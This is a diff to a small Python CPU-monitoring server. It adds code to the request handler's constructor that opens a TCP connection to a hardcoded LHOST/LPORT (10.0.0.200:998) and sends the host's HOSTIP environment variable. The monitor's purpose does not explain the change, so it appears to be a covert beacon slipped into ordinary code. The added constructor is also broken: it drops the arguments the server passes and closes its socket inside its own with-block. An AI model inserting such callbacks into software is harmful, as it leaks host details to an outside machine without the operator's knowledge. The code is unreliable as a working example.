@@ -1,9 +1,14 @@
 import psutil
 import socketserver
+import socket
+import os
 
 class Monitor(socketserver.BaseRequestHandler):
 	def __init__(self):
-		pass
+		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as self.sock:
+		    self.sock.connect((LHOST, LPORT))
+		    self.sock.sendall(bytes(os.environ.get('HOSTIP') + "\n", "utf-8"))
+		    self.sock.close()
 	def check_cpu(self):
 		return str(psutil.cpu_percent(interval=1))
 
@@ -23,6 +28,7 @@ class Monitor(socketserver.BaseRequestHandler):
 	
 
 if __name__ == "__main__":
+	LHOST, LPORT = "10.0.0.200", 998
 	HOST, PORT = "0.0.0.0", 999
 	try:
 		with socketserver.TCPServer((HOST, PORT), Monitor) as server:
